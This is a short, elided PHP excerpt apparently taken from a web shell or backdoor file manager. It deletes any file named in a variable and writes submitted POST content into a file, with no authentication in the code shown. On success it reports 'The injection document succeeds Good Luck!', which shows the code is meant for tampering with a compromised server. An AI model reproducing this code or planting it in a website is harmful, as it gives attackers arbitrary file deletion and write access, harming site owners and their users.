...
if(isset($delFile)&& $delFile!=""){    
        if(is_file($delFile)){     //Check if it is file type.
            $message = (@unlink($delFile)) //unlink funtion : Delete file if success return true else false.
              ...
              : "<font color=blue>The deletion is defeatedI'$delFile' The document exists!</font>" ;
        }else{
            $message = "<font color=blue>File '$delFile' does not existI</font>";
        }
        echo $message;
      }
...
if (isset($editFile)) {
  ...
  if(empty($_POST['newcontent'])){ //No change or first time edit file.
   ...
   if (!empty($_POST['newcontent'])) //If file is not empty
    {
       $fp=@fopen("$content","w+");
       echo ($result=@fwrite($fp,$_POST['newcontent']))?"<font color=red>The injection document succeedsIGood Luck!</font>":"<font color=blue>The injection document is defeatedI</font>"; 
       @fclose($fp);
    }
}
